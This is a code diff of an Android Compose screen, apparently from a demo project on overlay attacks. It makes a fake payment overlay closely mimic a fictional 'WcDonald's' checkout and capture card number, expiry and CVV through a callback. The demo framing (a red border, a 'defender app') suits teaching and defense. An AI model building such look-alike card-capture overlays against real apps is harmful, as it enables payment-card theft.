@@ -2,10 +2,12 @@ package com.ghosttouch.attacker.overlay
 
 import android.util.Log
 import androidx.compose.foundation.background
+import androidx.compose.foundation.border
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.filled.CreditCard
 import androidx.compose.material.icons.filled.DateRange
 import androidx.compose.material.icons.filled.Lock
@@ -22,24 +24,26 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
 /**
- * Fake payment overlay that mimics the WcDonald's payment screen.
+ * Fake payment overlay — pixel-perfect replica of the WcDonald's PaymentScreen.
  *
- * This overlay captures card details entered by the user, demonstrating
- * how financial data can be stolen through overlay attacks.
+ * Uses the exact same Material3 Scaffold/TopAppBar/Card/OutlinedTextField layout
+ * as the real defender app.
  *
- * @param onPaymentCaptured Callback with card number, expiry, and CVV.
- * @param onDismiss Callback when the overlay should be removed.
+ * Red border added for demo visibility.
  */
+
+private val WcRed = Color(0xFFDA291C)
+private val WcWhite = Color(0xFFFFFFFF)
+private val WcBackground = Color(0xFFFAFAFA)
+private val WcGray = Color(0xFFF5F5F5)
+private val DemoBorderRed = Color(0xFFFF0000)
+
+@OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun FakePaymentOverlay(
     onPaymentCaptured: (cardNumber: String, expiry: String, cvv: String) -> Unit,
     onDismiss: () -> Unit
 ) {
-    val wcRed = Color(0xFFDA291C)
-    val wcWhite = Color(0xFFFFFFFF)
-    val wcBackground = Color(0xFFFAFAFA)
-    val wcGray = Color(0xFFF5F5F5)
-
     var cardNumber by remember { mutableStateOf("") }
     var expiry by remember { mutableStateOf("") }
     var cvv by remember { mutableStateOf("") }
@@ -49,68 +53,60 @@ fun FakePaymentOverlay(
     Box(
         modifier = Modifier
             .fillMaxSize()
-            .background(wcBackground)
+            .border(3.dp, DemoBorderRed)
+            .background(WcBackground)
     ) {
-        Column(modifier = Modifier.fillMaxSize()) {
-            // Fake top bar
-            Box(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .statusBarsPadding()
-                    .height(64.dp)
-                    .background(wcRed),
-                contentAlignment = Alignment.CenterStart
-            ) {
-                Text(
-                    "Payment",
-                    color = wcWhite,
-                    fontSize = 20.sp,
-                    modifier = Modifier.padding(start = 56.dp)
+        Scaffold(
+            containerColor = WcBackground,
+            topBar = {
+                TopAppBar(
+                    title = { Text("Payment") },
+                    navigationIcon = {
+                        IconButton(onClick = { /* fake back */ }) {
+                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
+                        }
+                    },
+                    colors = TopAppBarDefaults.topAppBarColors(
+                        containerColor = WcRed,
+                        titleContentColor = WcWhite,
+                        navigationIconContentColor = WcWhite
+                    )
                 )
             }
-
+        ) { padding ->
             Column(
                 modifier = Modifier
-                    .fillMaxWidth()
+                    .fillMaxSize()
+                    .padding(padding)
                     .padding(24.dp),
                 verticalArrangement = Arrangement.spacedBy(16.dp)
             ) {
                 Text(
                     "Order Summary",
-                    fontSize = 20.sp,
+                    style = MaterialTheme.typography.titleLarge,
                     fontWeight = FontWeight.Bold
                 )
 
-                // Fake order summary
+                // Fake order summary — identical Card to defender
                 Card(
                     modifier = Modifier.fillMaxWidth(),
                     shape = RoundedCornerShape(12.dp),
-                    colors = CardDefaults.cardColors(containerColor = wcGray)
+                    colors = CardDefaults.cardColors(containerColor = WcGray)
                 ) {
                     Column(modifier = Modifier.padding(16.dp)) {
-                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
-                            Text("WcBurger Deluxe", fontSize = 14.sp)
-                            Text("$8.99", fontSize = 14.sp)
-                        }
-                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
-                            Text("Large Fries", fontSize = 14.sp)
-                            Text("$3.49", fontSize = 14.sp)
-                        }
-                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
-                            Text("WcFlurry", fontSize = 14.sp)
-                            Text("$4.29", fontSize = 14.sp)
-                        }
+                        OrderItem("WcBurger Deluxe", "$8.99")
+                        OrderItem("Large Fries", "$3.49")
+                        OrderItem("WcFlurry", "$4.29")
                         HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
-                        Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween) {
-                            Text("Total", fontWeight = FontWeight.Bold, fontSize = 16.sp)
-                            Text("$16.77", fontWeight = FontWeight.Bold, fontSize = 16.sp)
-                        }
+                        OrderItem("Total", "$16.77", bold = true)
                     }
                 }
 
+                Spacer(modifier = Modifier.height(8.dp))
+
                 Text(
                     "Card Details",
-                    fontSize = 16.sp,
+                    style = MaterialTheme.typography.titleMedium,
                     fontWeight = FontWeight.Bold
                 )
 
@@ -167,7 +163,7 @@ fun FakePaymentOverlay(
                         val capturedCard = cardNumber
                         val capturedExpiry = expiry
                         val capturedCvv = cvv
-                        Log.d("FakePaymentOverlay", "Capturing: card=*${capturedCard.takeLast(4)}, exp=$capturedExpiry")
+                        Log.d("FakePaymentOverlay", "Capturing: card=*${capturedCard.takeLast(4)}")
                         onPaymentCaptured(capturedCard, capturedExpiry, capturedCvv)
                         coroutineScope.launch {
                             delay(500)
@@ -178,12 +174,31 @@ fun FakePaymentOverlay(
                         .fillMaxWidth()
                         .height(52.dp),
                     shape = RoundedCornerShape(12.dp),
-                    colors = ButtonDefaults.buttonColors(containerColor = wcRed),
+                    colors = ButtonDefaults.buttonColors(containerColor = WcRed),
                     enabled = cardNumber.length == 16 && cvv.length == 3 && expiry.isNotBlank()
                 ) {
                     Text("Pay $16.77", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                 }
             }
         }
+    }
+}
+
+@Composable
+private fun OrderItem(name: String, price: String, bold: Boolean = false) {
+    Row(
+        modifier = Modifier.fillMaxWidth(),
+        horizontalArrangement = Arrangement.SpaceBetween
+    ) {
+        Text(
+            name,
+            fontWeight = if (bold) FontWeight.Bold else FontWeight.Normal,
+            fontSize = if (bold) 16.sp else 14.sp
+        )
+        Text(
+            price,
+            fontWeight = if (bold) FontWeight.Bold else FontWeight.Normal,
+            fontSize = if (bold) 16.sp else 14.sp
+        )
     }
 }
